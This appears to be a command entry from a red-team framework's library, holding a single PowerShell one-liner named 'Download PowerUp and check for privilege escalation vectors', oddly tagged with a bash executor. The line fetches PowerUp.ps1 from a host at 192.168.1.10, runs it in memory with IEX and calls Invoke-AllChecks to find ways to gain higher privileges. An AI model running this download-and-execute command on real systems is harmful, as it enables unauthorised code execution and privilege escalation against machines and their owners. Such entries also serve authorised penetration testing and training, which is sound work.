---
id: ddfd4af5-095a-40ce-b762-65f0a65879cb
name: Download PowerUp and check for privilege escalation vectors
type: command
executor: bash
data: 'IEX(New-Object Net.Webclient).DownloadString(''http://192.168.1.10:8080/tools/ps/PowerUp.ps1'');Invoke-AllChecks

  '
output: null
created_at: '2020-07-15T19:05:45.533535+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# Download PowerUp and check for privilege escalation vectors

```bash
IEX(New-Object Net.Webclient).DownloadString('http://192.168.1.10:8080/tools/ps/PowerUp.ps1');Invoke-AllChecks

```


